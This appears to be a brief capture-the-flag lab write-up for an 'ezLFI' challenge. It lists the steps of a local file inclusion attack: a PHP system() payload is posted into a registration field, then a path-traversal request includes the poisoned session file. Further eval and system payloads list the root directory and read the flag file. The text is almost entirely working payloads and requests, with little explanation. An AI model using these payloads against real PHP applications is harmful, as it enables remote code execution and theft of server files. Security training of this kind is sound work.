# Lab0x03 Writeup

## ezLFI
1. https://edu-ctf.csie.org:10157/?action=register
post data: user=<?php system("ls /"); ?>

<?php eval('system(ls /);');
flag-66666666666
2. sessid = 7tmue803aqp8nrqvscbu5kufl4
3. finally https://edu-ctf.csie.org:10157/?action=module&m=../../../../var/lib/php/session/sess_7tmue803aqp8nrqvscbu5kufl4

<?php system('echo $(ls /);');?>
<?php eval('echo `ls /`;');?>
<?php eval('echo `cat /flag-66666666666`;');?>
